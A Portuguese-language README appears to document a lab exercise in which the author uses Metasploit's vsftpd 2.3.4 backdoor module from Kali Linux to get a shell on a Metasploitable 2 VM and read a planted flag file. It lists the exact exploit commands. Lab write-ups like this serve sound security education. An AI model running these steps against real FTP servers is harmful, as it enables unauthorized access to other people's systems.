# Explorar falhas no protocolo FTP

Este projeto demonstra como explorar uma vulnerabilidade no protocolo FTP utilizando o Metasploit para acessar um arquivo em uma máquina vulnerável.

## Objetivo

Encontrar e acessar um arquivo de texto criado em uma máquina virtual vulnerável (Metasploitable) através de uma outra máquina (Kali Linux).

## Ferramentas Utilizadas

- **Kali Linux**
- **Metasploitable 2** (máquina vulnerável)
- **Metasploit Framework**

## Procedimento

### 1. Criar um arquivo na VM vulnerável
Na máquina Metasploitable, criei um arquivo `flag.txt` com o seguinte conteúdo:
```bash
"teste de penet"
```

Comando para criar o arquivo:
```bash
echo "teste de penet" > flag.txt
```

Localização do arquivo: `/home/msfadmin/flag.txt`

![image](https://github.com/user-attachments/assets/32125f40-a630-43a3-88dd-51a30129e13e)

### 2. Configuração do Metasploit na Kali Linux

No Kali Linux, execute os seguintes passos:

1. Abra o Metasploit com o comando:
   ```bash
   msfconsole
   ```

2. Escolha o exploit `vsftpd_234_backdoor`:
   ```bash
   use unix/ftp/vsftpd_234_backdoor
   ```

3. Configure o IP de destino (a máquina vulnerável):
   ```bash
   set rhosts 192.168.56.101
   ```

4. Verifique as opções configuradas:
   ```bash
   show options
   ```

5. Configure o payload para interagir com o sistema:
   ```bash
   set payload payload/cmd/unix/interact
   ```

6. Execute o exploit:
   ```bash
   exploit
   ```

7. Verifique o IP para confirmar que é o mesmo da VM vulnerável:
   ```bash
   ip addr
   ```
![image](https://github.com/user-attachments/assets/d85d9068-0325-4119-9d44-f996563bdc13)

### 3. Acessar o arquivo na máquina vulnerável

1. Navegue até o diretório do arquivo:
   ```bash
   ls
   cd home
   cd msfadmin
   ls
   ```

2. Abra o arquivo para ler o conteúdo:
   ```bash
   nano flag.txt
   ```
![image](https://github.com/user-attachments/assets/e311aa74-63ce-4d6e-a576-e00f04fc1724)

## Resultados

Conseguimos localizar e acessar o arquivo `flag.txt` com sucesso através do Metasploit.

---

**Nota:** Este experimento foi realizado em um ambiente controlado para fins educacionais.

